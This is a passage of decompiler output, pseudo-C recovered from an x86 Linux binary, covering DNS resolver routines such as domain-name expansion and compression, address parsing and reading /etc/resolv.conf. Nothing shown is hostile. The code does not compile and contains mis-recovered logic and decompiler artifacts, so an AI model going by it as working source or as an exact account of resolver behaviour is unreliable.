                if(L080565F8( *ebx, Vffffff98) == 0) {
                    Vffffff9c = Vffffff9c + 1;
                }
                ebx = ebx + 4;
            } while(*ebx != 0);
        } else {
            Vffffff9c = Vffffff9c + 1;
        }
        if(edi != 0) {
            if(*L08078510 == 0) {
                goto L0804c8f0;
            }
            ebx = *(esi + 12);
            *L08079CE0 = *(esi + 8);
            *L08079CE4 = *(esi + 12);
            if(Vffffffa4 >= ebx) {
                L08056480( *( *(esi + 16)), Vffffffac, ebx);
                edx = Vffffffac;
                ecx = Vffffffb4;
                *ecx = edx;
                ecx = ecx + 4;
                Vffffffb4 = ecx;
                *Vffffffb4 = 0;
                Vffffffac = edx + ebx;
                Vffffffa4 = Vffffffa4 - ebx;
            }
            edi = 0;
        }
        if(Vffffff9c == 0) {
            continue;
        }
        ebx = *(esi + 12);
        if(Vffffffa0 >= ebx) {
            L08056480( *( *(esi + 16)), Vffffffa8, ebx);
            ecx = Vffffffa8;
            edx = Vffffffb0;
            *edx = ecx;
            edx = edx + 4;
            Vffffffb0 = edx;
            *Vffffffb0 = 0;
            Vffffffa8 = ecx + ebx;
            Vffffffa0 = Vffffffa0 - ebx;
        }
    }
    goto L0804c7b0;
L0804c8d8:
    L0804C574();
    if(*L08079BB8 == 0) {
        eax = 0;
        goto L0804c9d4;
L0804c8f0:
        L0804C574();
        eax = esi;
    } else {
        *L08079CDC = 0x8079cec;
        *L08079CD8 = 0x8079d78;
        Vffffff94 = 0;
        Vffffff90 = -1;
        if(*L08079C48 != 0) {
            Vffffff8c = 0x8079c48;
            do {
                edi = 0;
                if(*L08079BB8 != 0) {
                    esi = 0x8079bb8;
                    do {
                        L08056480( *Vffffff8c, & Vffffffbc, *L08079CE4);
                        ebx = Vffffffbc;
                        asm("xchg bl,bh");
                        asm("ror ebx,0x10");
                        asm("xchg bl,bh");
                        L08056480( *esi, & Vffffffb8, *L08079CE4);
                        eax = ebx ^ Vffffffb8;
                        Vffffffbc = eax;
                        if(eax < Vffffff90) {
                            Vffffff94 = edi;
                            Vffffff90 = eax;
                        }
                        esi = esi + 4;
                        edi = edi + 1;
                    } while(*esi != 0);
                }
                Vffffff8c = Vffffff8c + 4;
            } while(*Vffffff8c != 0);
        }
        if(Vffffff94 != 0) {
            edx = Vffffff94;
            *L08079BB8 = *(edx * 4 + 0x8079bb8);
            *(edx * 4 + 0x8079bb8) = *L08079BB8;
        }
        *L08079CE8 = 0x8079bb8;
        eax = 0x8079cd8;
    }
L0804c9d4:
    esp = ebp + -132;
}



L0804C9E4(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    if(*L0807852C == 0 && L0805D5F8(0x807852c) != 0) {
        goto L0804cab1;
    }
    if(ebx != 0) {
        (save) & Vfffffff8;
        (save) & Vfffffffc;
        al = 0;
        edi = ebx;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        (save) !ecx - 1;
        (save)ebx;
        (save)Ac;
        (save) *L0807852C;
        eax = L0805D3A8();
        esp = esp + 24;
    } else {
        if(*L08078528 != 0) {
            if(L0805D638( *L0807852C, Ac, 0x8079dcc, 0x8079dd0, & Vfffffffc, & Vfffffff8) != 0) {
                goto L0804cab1;
            }
            *L08078528 = 0;
            goto L0804cab8;
        }
        eax = L0805D814( *L0807852C, Ac, *L08079DCC, *L08079DD0, 0x8079dcc, 0x8079dd0, & Vfffffffc, & Vfffffff8);
    }
    if(eax != 0) {
L0804cab1:
        eax = 0;
    } else {
L0804cab8:
        ebx = L08057970(Vfffffffc, 10);
        if(ebx != 0) {
            *ebx = 0;
        }
        (save)" \t";
        (save)Vfffffffc;
        ebx = L08057B30();
        *ebx = 0;
        ebx = ebx + 1;
        *L08079DC8 = 0x807a340;
        *L0807A340 = 0x807a31c;
        (save)Vfffffffc;
        *( *( *L08079DC8)) = L0804CE8C();
        *L08079DC4 = 4;
        *L08079DC0 = 2;
        for(esp = esp + 12; *ebx == 32 || *ebx == 9; ebx = ebx + 1) {
        }
        *L08079DB8 = ebx;
        *L08079DBC = 0x8079e88;
        for(edi = 0x8079e88; 1; edi = edi + 4) {
            ebx = L08057B30(ebx, " \t");
            if(ebx == 0) {
                break;
            }
            *ebx = 0;
            do {
                if(!(ebx = ebx + 1) || *ebx == 0) {
                    goto L0804cb7e;
                }
                if(*ebx == 32) {
                    continue;
                }
            } while(*ebx == 9);
            if(edi >= 0x8079f10) {
                continue;
            }
            *edi = ebx;
        }
L0804cb7e:
        *edi = 0;
        eax = 0x8079db8;
    }
    esp = ebp - 20;
}




L0804CBE4(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffa0;
	/* unknown */ void  Vffffffa4;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffba;



    Vffffffb0 = 0;
    Vffffffb4 = A8;
    Vffffffa4 = 0;
    edi = Ac;
    if(Vffffffb0 < edi) {
        if(!(edi & 1)) {
            ecx = 0;
            eax = *L080786A8 >> 4 & 255;
            if(Vffffffb0 < eax) {
                esi = *edx;
                ebx = eax;
                Vffffffa0 = 0;
                do {
                    eax = *esi;
                    edx = Vffffffa0;
                    eax = eax & *(edx + 0x80786b0);
                    if(*(edx + 0x80786ac) == eax) {
                        break;
                    }
                    Vffffffa0 = edx + 8;
                    ecx = ecx + 1;
                } while(ecx < ebx);
            }
            edi = Vffffffa4;
            *(ebp + edi * 2 - 72) = cx;
            if(Vffffffb0 == 0 && edi > 0) {
                eax = *(ebp + edi * 2 - 74);
                if(ecx < eax) {
                    Vffffffb0 = edi;
                }
            }
            Vffffffa4 = Vffffffa4 + 1;
            Vffffffb4 = Vffffffb4 + 4;
        } else {
L0804cc80:
            ecx = 0;
            eax = *L080786A8 >> 4 & 255;
            if(0 < eax) {
                esi = *Vffffffb4;
                ebx = eax;
                Vffffffa0 = 0;
                do {
                    eax = *esi;
                    edx = Vffffffa0;
                    eax = eax & *(edx + 0x80786b0);
                    if(*(edx + 0x80786ac) == eax) {
                        break;
                    }
                    Vffffffa0 = edx + 8;
                    ecx = ecx + 1;
                } while(ecx < ebx);
            }
            edi = Vffffffa4;
            *(ebp + edi * 2 - 72) = cx;
            if(Vffffffb0 == 0 && edi > 0) {
                eax = *(ebp + edi * 2 - 74);
                if(ecx < eax) {
                    Vffffffb0 = edi;
                }
            }
            esi = Vffffffa4 + 1;
            ecx = 0;
            eax = *L080786A8 >> 4 & 255;
            if(0 < eax) {
                Vffffffa8 = *(Vffffffb4 + 4);
                ebx = eax;
                Vffffffa0 = 0;
                do {
                    edi = Vffffffa0;
                    eax = *Vffffffa8 & *(edi + 0x80786b0);
                    if(*(edi + 0x80786ac) == eax) {
                        break;
                    }
                    Vffffffa0 = edi + 8;
                    ecx = ecx + 1;
                } while(ecx < ebx);
            }
            *(ebp + esi * 2 - 72) = cx;
            if(Vffffffb0 == 0 && esi > 0) {
                eax = *(ebp + esi * 2 - 74);
                if(ecx < eax) {
                    Vffffffb0 = esi;
                }
            }
            Vffffffa4 = Vffffffa4 + 2;
            Vffffffb4 = Vffffffb4 + 8;
        }
        if(Vffffffa4 < Ac) {
            goto L0804cc80;
        }
    }
    if(Vffffffb0 != 0) {
        edi = Ac;
        if(Vffffffb0 < edi) {
            edx = & Vffffffba;
            Vffffffac = edx;
            if(edi - Vffffffb0 & 1) {
                goto L0804cdd8;
            }
            if(!(ecx = Vffffffb0 - 1)) {
                esi = A8 + ecx * 4;
                ebx = edx + ecx * 2;
                do {
                    ax = *(ebp + ecx * 2 - 72);
                    if(*ebx >= ax) {
                        break;
                    }
                    Vffffffa4 = ax;
                    *(ebp + ecx * 2 - 72) = *ebx;
                    *ebx = Vffffffa4;
                    edx = *esi;
                    edi = A8;
                    eax = *(edi + ecx * 4 + 4);
                    *esi = eax;
                    *(edi + ecx * 4 + 4) = edx;
                    esi = esi + -4;
                    ebx = ebx + -2;
                } while(ecx = ecx - 1);
            }
            Vffffffb0 = Vffffffb0 + 1;
            if(Vffffffb0 < Ac) {
L0804cdd8:
                do {
                    if(!(ecx = Vffffffb0 - 1)) {
                        esi = A8 + ecx * 4;
                        ebx = Vffffffac + ecx * 2;
                        do {
                            ax = *(ebp + ecx * 2 - 72);
                            if(*ebx >= ax) {
                                break;
                            }
                            Vffffffa4 = ax;
                            *(ebp + ecx * 2 - 72) = *ebx;
                            *ebx = Vffffffa4;
                            edi = *esi;
                            edx = A8;
                            eax = *(edx + ecx * 4 + 4);
                            *esi = eax;
                            *(edx + ecx * 4 + 4) = edi;
                            esi = esi + -4;
                            ebx = ebx + -2;
                        } while(ecx = ecx - 1);
                    }
                    ecx = Vffffffb0;
                    if(ecx >= 0) {
                        esi = A8 + ecx * 4;
                        ebx = Vffffffac + ecx * 2;
                        do {
                            ax = *(ebp + ecx * 2 - 72);
                            if(*ebx >= ax) {
                                break;
                            }
                            Vffffffa4 = ax;
                            *(ebp + ecx * 2 - 72) = *ebx;
                            *ebx = Vffffffa4;
                            edi = *esi;
                            edx = A8;
                            eax = *(edx + ecx * 4 + 4);
                            *esi = eax;
                            *(edx + ecx * 4 + 4) = edi;
                            esi = esi + -4;
                            ebx = ebx + -2;
                        } while(ecx = ecx - 1);
                    }
                    Vffffffb0 = Vffffffb0 + 2;
                } while(Vffffffb0 < Ac);
            }
        }
    }
    esp = ebp - 108;
}



L0804CE8C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    if(L0804CEB4(A8, & Vfffffffc) == 0) {
        return(-1);
    }
    esp = ebp;
    return(Vfffffffc);
}



L0804CEB4(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    for(Vffffffe8 = & Vfffffff0; 1; ebx = ebx + 1) {
        esi = 0;
        Vffffffec = 10;
        if(*ebx == 48) {
            ebx = ebx + 1;
            if(*ebx != 120) {
                if(*ebx == 88) {
                    goto L0804cee1;
                }
L0804ceec:
                Vffffffec = 8;
            } else {
L0804cee1:
                Vffffffec = 16;
                ebx = ebx + 1;
            }
        }
        al = *ebx;
        if(al != 0) {
            edi = *L08078FA0;
            do {
                if(al >= 0) {
                    edx = al & 255;
                    if(!( *(edi + edx * 2 + 1) & 8)) {
                        goto L0804cf0e;
                    }
                }
                if(Vffffffec != 16 || al < 0) {
                    break;
                }
                eax = eax & 255;
                if(*(edi + eax * 2 + 1) & 16) {
                    break;
                }
                ecx = eax + 10;
                Vffffffe4 = ecx;
                edx = esi << 4;
                if(*(edi + eax * 2 + 1) & 2) {
                    esi = Vffffffe4 + edx - 65;
                } else {
                    esi = ecx + edx - 97;
                    goto L0804cf53;
L0804cf0e:
                    eax = Vffffffec;
                    esi = esi * eax;
                    esi = edx + eax - 48;
                }
L0804cf53:
                ebx = ebx + 1;
                al = *ebx;
            } while(al != 0);
        }
        if(*ebx != 46) {
            goto L0804cf84;
        }
        eax = & Vfffffffc;
        if(Vffffffe8 >= eax || esi > 255) {
            goto L0804cfec;
        }
        ecx = Vffffffe8;
        *ecx = esi;
        Vffffffe8 = ecx + 4;
    }
    goto L0804ceec;
L0804cf84:
    if(*ebx != 0) {
        < ? L0804cfec : ;
        edx = *ebx & 255;
        if(*( *L08078FA0 + edx * 2 + 1) & 32) {
            goto L0804cfec;
        }
    }
    eax = (Vffffffe8 - & Vfffffff0 >> 2) + 1;
    if(eax != 2) {
        <= ? L0804d008 : ;
        if(eax == 3) {
            goto L0804cfcc;
        }
        if(eax == 4) {
            goto L0804cfe4;
        }
    } else {
        if(esi <= 16777215) {
            eax = Vfffffff0 << 24;
            goto L0804d006;
L0804cfcc:
            if(esi <= 65535) {
                eax = Vfffffff0 << 24;
                edx = Vfffffff4 << 16;
                goto L0804d004;
L0804cfe4:
                if(esi <= 255) {
                    goto L0804cff0;
                }
            }
        }
L0804cfec:
        eax = 0;
        goto L0804d021;
L0804cff0:
        eax = Vfffffff0 << 24 | Vfffffff4 << 16;
        edx = Vfffffff8 << 8;
L0804d004:
        eax = eax | edx;
L0804d006:
        esi = esi | eax;
    }
    if(Ac != 0) {
        eax = esi;
        asm("xchg al,ah");
        asm("ror eax,0x10");
        asm("xchg al,ah");
        *Ac = eax;
    }
    eax = 1;
L0804d021:
    esp = ebp - 40;
}



L0804D02C(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = -1;
    Vfffffff8 = 0;
    ecx = A14;
    Vfffffff4 = ecx + A18;
    edi = A10;
    esi = *edi & 255;
    ebx = edi;
    goto L0804d257;
L0804d24a:
    eax = -1;
    goto L0804d296;
L0804d257:
    while(1) {
        ebx = ebx + 1;
        if(esi == 0) {
            break;
        }
        if(eax = esi & 192) {
            if(A14 != ecx) {
                if(Vfffffff4 <= ecx) {
                    goto L0804d24a;
                }
                *ecx = 46;
                ecx = ecx + 1;
            }
            eax = esi + ecx;
            if(Vfffffff4 <= eax) {
                goto L0804d24a;
            }
            Vfffffff8 = esi + Vfffffff8 + 1;
            if(!(esi = esi - 1)) {
                eax = !esi & 3;
                if(esi > -1) {
                    if(eax == 0) {
                        goto L0804d158;
                    }
                    if(eax < 3) {
                        if(eax < 2) {
                            edx = *ebx & 255;
                            ebx = ebx + 1;
                            if(edx == 46 || edx == 92) {
                                eax = esi + ecx + 2;
                                if(Vfffffff4 <= eax) {
                                    goto L0804d24a;
                                }
                                *ecx = 92;
                                ecx = ecx + 1;
                            }
                            *ecx = dl;
                            ecx = ecx + 1;
                            if(Ac <= ebx) {
                                goto L0804d24a;
                            }
                            esi = esi - 1;
                        }
                        edx = *ebx & 255;
                        ebx = ebx + 1;
                        if(edx == 46 || edx == 92) {
                            eax = esi + ecx + 2;
                            if(Vfffffff4 <= eax) {
                                goto L0804d24a;
                            }
                            *ecx = 92;
                            ecx = ecx + 1;
                        }
                        *ecx = dl;
                        ecx = ecx + 1;
                        if(Ac <= ebx) {
                            goto L0804d24a;
                        }
                        esi = esi - 1;
                    }
                }
                edx = *ebx & 255;
                ebx = ebx + 1;
                if(edx == 46 || edx == 92) {
                    eax = esi + ecx + 2;
                    if(Vfffffff4 <= eax) {
                        goto L0804d24a;
                    }
                    *ecx = 92;
                    ecx = ecx + 1;
                }
                *ecx = dl;
                ecx = ecx + 1;
                if(Ac <= ebx) {
                    goto L0804d24a;
                }
                if(!(esi = esi - 1)) {
L0804d158:
                    do {
                        edx = *ebx & 255;
                        ebx = ebx + 1;
                        if(edx == 46 || edx == 92) {
                            if(Vfffffff4 <= esi + ecx + 2) {
                                goto L0804d24a;
                            }
                            *ecx = 92;
                            ecx = ecx + 1;
                        }
                        *ecx = dl;
                        ecx = ecx + 1;
                        if(Ac <= ebx) {
                            goto L0804d24a;
                        }
                        eax = esi - 1;
                        edx = *ebx & 255;
                        ebx = ebx + 1;
                        if(edx == 46 || edx == 92) {
                            if(Vfffffff4 <= eax + ecx + 2) {
                                goto L0804d24a;
                            }
                            *ecx = 92;
                            ecx = ecx + 1;
                        }
                        *ecx = dl;
                        ecx = ecx + 1;
                        if(Ac <= ebx) {
                            goto L0804d24a;
                        }
                        eax = esi - 2;
                        edx = *ebx & 255;
                        ebx = ebx + 1;
                        if(edx == 46 || edx == 92) {
                            if(Vfffffff4 <= eax + ecx + 2) {
                                goto L0804d24a;
                            }
                            *ecx = 92;
                            ecx = ecx + 1;
                        }
                        *ecx = dl;
                        ecx = ecx + 1;
                        if(Ac <= ebx) {
                            goto L0804d24a;
                        }
                        eax = esi - 3;
                        edx = *ebx & 255;
                        ebx = ebx + 1;
                        if(edx == 46 || edx == 92) {
                            eax = eax + ecx + 2;
                            if(Vfffffff4 <= eax) {
                                goto L0804d24a;
                            }
                            *ecx = 92;
                            ecx = ecx + 1;
                        }
                        *ecx = dl;
                        ecx = ecx + 1;
                        if(Ac <= ebx) {
                            goto L0804d24a;
                        }
                    } while(esi = esi + -4);
                }
            }
        } else {
            if(eax != 192) {
                goto L0804d24a;
            }
            if(Vfffffffc < 0) {
                Vfffffffc = ebx - A10 + 1;
            }
            eax = (esi & 63) << 8;
            eax = eax | *ebx & 255;
            ebx = A8 + eax;
            if(A8 > ebx || Ac <= ebx) {
                goto L0804d24a;
            }
            Vfffffff8 = Vfffffff8 + 2;
            eax = Ac - A8;
            if(Vfffffff8 >= eax) {
                goto L0804d24a;
            }
        }
        esi = *ebx & 255;
    }
    *ecx = 0;
    ecx = A14;
    edx = *ecx & 255;
    if(edx != 0) {
        eax = *L08078FA0;
        do {
            if(dl >= 0 && *(eax + edx * 2 + 1) & 32) {
                goto L0804d24a;
            }
            ecx = ecx + 1;
            edx = *ecx & 255;
        } while(edx != 0);
    }
    if(Vfffffffc < 0) {
        Vfffffffc = ebx - A10;
    }
    eax = Vfffffffc;
L0804d296:
    esp = ebp - 24;
}


L0804D2A0(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A8;
    edi = Ac;
    Vfffffff4 = edi + A10;
    Vfffffffc = 0;
    Vfffffff8 = 0;
    if(A14 != 0) {
        edx = *A14;
        Vfffffff0 = edx;
        A14 = A14 + 4;
        if(Vfffffff0 == 0) {
            goto L0804d30b;
        }
        edx = A14;
        Vfffffffc = edx;
        do {
            Vfffffffc = Vfffffffc + 4;
        } while(*Vfffffffc != 0);
        Vfffffff8 = Vfffffffc;
        goto L0804d30b;
L0804d2fc:
        edi = edi - 1;
    } else {
        Vfffffff0 = 0;
L0804d30b:
        ebx = *esi & 255;
        esi = esi + 1;
        if(ebx != 0) {
            do {
                if(Vfffffff0 != 0) {
                    eax = L0804D484(esi - 1, Vfffffff0, A14, Vfffffff8);
                    if(eax >= 0) {
                        goto L0804d33c;
                    }
                    if(A18 != 0 && Vfffffffc < A18 + -4) {
                        edx = Vfffffffc;
                        *edx = edi;
                        edx = edx + 4;
                        Vfffffffc = edx;
                        *Vfffffffc = 0;
                    }
                }
                Vffffffec = edi;
                edi = edi + 1;
                do {
                    if(ebx == 46) {
                        goto L0804d3ac;
                    }
                    if(ebx == 92) {
                        ebx = *esi & 255;
                        esi = esi + 1;
                        if(ebx == 0) {
                            break;
                        }
                    }
                    if(Vfffffff4 <= edi) {
                        goto L0804d3da;
                    }
                    *edi = bl;
                    edi = edi + 1;
                    ebx = *esi & 255;
                    esi = esi + 1;
                } while(ebx != 0);
                goto L0804d3b0;
L0804d3ac:
                ebx = *esi & 255;
                esi = esi + 1;
L0804d3b0:
                if(!(ecx = edi - Vffffffec - 1) && ebx == 0) {
                    goto L0804d2fc;
                }
                if(ecx - 1 > 62) {
                    goto L0804d3da;
                }
                *Vffffffec = cl;
            } while(ebx != 0);
            goto L0804d3d5;
L0804d33c:
            ebx = edi + 1;
            if(Vfffffff4 <= ebx) {
                goto L0804d3e9;
            }
            *edi = eax >> 8 | 192;
            edi = ebx;
            edx = edi;
            edi = edi + 1;
            *edx = cl;
            goto L0804d3f4;
        }
    }
L0804d3d5:
    if(Vfffffff4 <= edi) {
L0804d3da:
        if(Vfffffff0 != 0) {
            *Vfffffff8 = 0;
        }
L0804d3e9:
        eax = -1;
    } else {
        *edi = 0;
        edi = edi + 1;
L0804d3f4:
        eax = edi - Ac;
    }
    esp = ebp - 32;
}



L0804D404(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = A8;
    if(A8 < Ac) {
        do {
            edx = *eax & 255;
            eax = eax + 1;
            if(edx == 0) {
                break;
            }
            if(!(ecx = edx & 192)) {
                goto L0804d42a;
            }
            eax = eax + edx;
        } while(eax < Ac);
        goto L0804d440;
L0804d42a:
        if(ecx != 192) {
            goto L0804d448;
        }
        eax = eax + 1;
    }
L0804d440:
    if(eax <= Ac) {
        eax = eax - A8;
    } else {
L0804d448:
        eax = -1;
    }
}



L0804D458(A8)
/* unknown */ void  A8;
{



    if(A8 >= 0 && !( *( *L08078FA0 + edx * 2 + 1) & 1)) {
        return(*( *L08078FA4 + edx * 4));
    }
    eax = edx;
    esp = ebp;
}



L0804D484(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = A10;
    goto L0804d69c;
L0804d68f:
    eax = Vfffffff8 - Ac;
    goto L0804d6ad;
L0804d69c:
    while(Vfffffffc < A14) {
        ebx = A8;
        ecx = *Vfffffffc;
        Vfffffff8 = ecx;
        esi = *ecx & 255;
        for(edi = ecx; 1; esi = *edi & 255) {
            edi = edi + 1;
            if(esi == 0) {
                break;
            }
            if(eax = esi & 192) {
                if(!(esi = esi - 1)) {
                    eax = !esi & 3;
                    if(esi > -1) {
                        if(eax == 0) {
                            goto L0804d590;
                        }
                        if(eax < 3) {
                            if(eax < 2) {
                                if(*ebx == 46) {
                                    goto L0804d698;
                                }
                                if(*ebx == 92) {
                                    ebx = ebx + 1;
                                }
                                ebx = ebx + 1;
                                Vfffffff4 = L0804D458( *ebx & 255);
                                edi = edi + 1;
                                if(Vfffffff4 != L0804D458( *edi & 255)) {
                                    goto L0804d698;
                                }
                                esi = esi - 1;
                            }
                            if(*ebx == 46) {
                                goto L0804d698;
                            }
                            if(*ebx == 92) {
                                ebx = ebx + 1;
                            }
                            ebx = ebx + 1;
                            Vfffffff0 = L0804D458( *ebx & 255);
                            edi = edi + 1;
                            if(Vfffffff0 != L0804D458( *edi & 255)) {
                                goto L0804d698;
                            }
                            esi = esi - 1;
                        }
                    }
                    if(*ebx == 46) {
                        goto L0804d698;
                    }
                    if(*ebx == 92) {
                        ebx = ebx + 1;
                    }
                    ebx = ebx + 1;
                    Vffffffec = L0804D458( *ebx & 255);
                    edi = edi + 1;
                    if(Vffffffec != L0804D458( *edi & 255)) {
                        goto L0804d698;
                    }
                    if(!(esi = esi - 1)) {
L0804d590:
                        do {
                            if(*ebx == 46) {
                                goto L0804d698;
                            }
                            if(*ebx == 92) {
                                ebx = ebx + 1;
                            }
                            ebx = ebx + 1;
                            Vffffffe8 = L0804D458( *ebx & 255);
                            edi = edi + 1;
                            if(Vffffffe8 != L0804D458( *edi & 255)) {
                                goto L0804d698;
                            }
                            esi = esi - 1;
                            if(*ebx == 46) {
                                goto L0804d698;
                            }
                            if(*ebx == 92) {
                                ebx = ebx + 1;
                            }
                            ebx = ebx + 1;
                            Vffffffe4 = L0804D458( *ebx & 255);
                            edi = edi + 1;
                            if(Vffffffe4 != L0804D458( *edi & 255)) {
                                goto L0804d698;
                            }
                            esi = esi - 1;
                            if(*ebx == 46) {
                                goto L0804d698;
                            }
                            if(*ebx == 92) {
                                ebx = ebx + 1;
                            }
                            ebx = ebx + 1;
                            Vffffffe0 = L0804D458( *ebx & 255);
                            edi = edi + 1;
                            if(Vffffffe0 != L0804D458( *edi & 255)) {
                                goto L0804d698;
                            }
                            esi = esi - 1;
                            if(*ebx == 46) {
                                goto L0804d698;
                            }
                            if(*ebx == 92) {
                                ebx = ebx + 1;
                            }
                            ebx = ebx + 1;
                            Vffffffdc = L0804D458( *ebx & 255);
                            edi = edi + 1;
                            if(Vffffffdc != L0804D458( *edi & 255)) {
                                goto L0804d698;
                            }
                        } while(esi = esi - 1);
                    }
                }
                esi = *ebx & 255;
                ebx = ebx + 1;
                if(esi == 0 && *edi == 0) {
                    goto L0804d68f;
                }
                if(esi == 46) {
                    goto L0804d67e;
                } else {
                    goto L0804d698;
                }
            }
            if(eax != 192) {
                goto L0804d6a8;
            }
            eax = (esi & 63) << 8;
            eax = eax | *edi & 255;
            edi = Ac + eax;
L0804d67e:
        }
        if(*ebx == 0) {
            goto L0804d68f;
        }
L0804d698:
        Vfffffffc = Vfffffffc + 4;
    }
L0804d6a8:
    eax = -1;
L0804d6ad:
    esp = ebp - 48;
}



L0804D6B8(A8)
/* unknown */ void  A8;
{



    dx = *A8 << 8;
    return((dx | *(A8 + 1) & 65535) & 65535);
}



L0804D6D4(A8)
/* unknown */ void  A8;
{



    ecx = *A8 << 24;
    ecx = ecx | ( *(A8 + 1) & 255) << 16;
    ecx = ecx | ( *(A8 + 2) & 255) << 8;
    return(ecx | *(A8 + 3) & 255);
}



L0804D700(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    *Ac = A8 >> 8;
    *(Ac + 1) = A8;
    return(*Ac);
}



L0804D71C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = ecx >> 24;
    *Ac = al;
    eax = ecx >> 16;
    *(Ac + 1) = al;
    *(Ac + 2) = ecx >> 8;
    *(Ac + 3) = A8;
    return(*(Ac + 2));
}



L0804D744()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffbdc;
	/* unknown */ void  Vfffffbe0;
	/* unknown */ void  Vfffffbe4;
	/* unknown */ void  Vfffffbe8;
	/* unknown */ void  Vfffffbec;
	/* unknown */ void  Vfffffbf0;
	/* unknown */ void  Vfffffbf4;
	/* unknown */ void  Vfffffbf8;
	/* unknown */ void  Vfffffbfc;
	/* unknown */ void  Vfffffc00;
	/* unknown */ void  Vfffffc06;
	/* unknown */ void  Vfffffc07;
	/* unknown */ void  Vfffffc08;
	/* unknown */ void  Vfffffc0a;



    Vfffffbf0 = 0;
    Vfffffbec = 0;
    Vfffffbe8 = 0;
    Vfffffbe4 = 0;
    if(*L08078544 == 0) {
        *L08078544 = 5;
    }
    if(*L08078548 == 0) {
        *L08078548 = 4;
    }
    if(!( *L0807854C & 1)) {
        *L0807854C = 704;
    }
    if(*L08078584 == 0) {
        L0804DFB4();
        *L08078584 = ax;
    }
    *L08078558 = 0;
    *L08078554 = 2;
    *L08078556 = 13568;
    *L08078550 = 1;
    *L080786A8 = *L080786A8 & 240;
    *L080786A8 = *L080786A8 | 1;
    *L080786A4 = 0;
    ebx = L08055668("LOCALDOMAIN");
    if(ebx != 0) {
        L0805680C(0x80785a4, ebx, 255);
        Vfffffbec = Vfffffbec + 1;
        ebx = 0x80785a4;
        *L08078588 = 0x80785a4;
        edx = 0x807858c;
        esi = 0;
        if(*L080785A4 != 0) {
            do {
                if(edx >= 0x80785a0 || *ebx == 10) {
                    break;
                }
                if(*ebx != 32) {
                    if(*ebx == 9) {
                        goto L0804d86b;
                    }
                    if(esi != 0) {
                        *edx = ebx;
                        edx = edx + 4;
                        esi = 0;
                        Vfffffbe8 = 1;
                    }
                } else {
L0804d86b:
                    *ebx = 0;
                    esi = 1;
                }
                ebx = ebx + 1;
            } while(*ebx != 0);
            while(*ebx != 0 && *ebx != 32 && *ebx + 247 > 1) {
                ebx = ebx + 1;
            }
        }
        *ebx = 0;
        *edx = 0;
    }
    eax = L0804F620("/etc/resolv.conf", "r");
    Vfffffbf4 = eax;
    if(Vfffffbf4 != 0) {
        Vfffffbdc = & Vfffffc00;
L0804d8e0:
        while(1) {
            if(L0804F5C4(Vfffffbdc, 1024, Vfffffbf4) == 0) {
                goto L0804dd98;
            }
            if(Vfffffc00 == 59 || Vfffffc00 == 35) {
                continue;
            }
            if(L08057B04(Vfffffbdc, "domain", 6) != 0 || Vfffffc06 != 32 && Vfffffc06 != 9) {
L0804d9c0:
                if(L08057B04(Vfffffbdc, "search", 6) != 0 || Vfffffc06 != 32 && Vfffffc06 != 9) {
                    if(L08057B04(Vfffffbdc, "nameserver", 10) == 0) {
                        if(Vfffffc0a == 32) {
                            goto L0804db0c;
                        }
                        if(Vfffffc0a == 9) {
L0804db0c:
                            if(Vfffffbf0 <= 2) {
                                goto L0804db19;
                            }
                        }
                    }
                    if(L08057B04(Vfffffbdc, "sortlist", 8) != 0 || Vfffffc08 != 32 && Vfffffc08 != 9) {
                        if(L08057B04(Vfffffbdc, "options", 7) != 0 || Vfffffc07 != 32 && Vfffffc07 != 9) {
                            continue;
                        }
                        L0804DE68( & Vfffffc07, "conf");
                        continue;
                    }
                    ebx = & Vfffffc08;
                    if(Vfffffbe4 > 9) {
                        continue;
                    }
                    edi = Vfffffbe4 * 8;
                    do {
                        if(*ebx == 32 || *ebx == 9) {
                            ebx = ebx + 1;
                            continue;
                        }
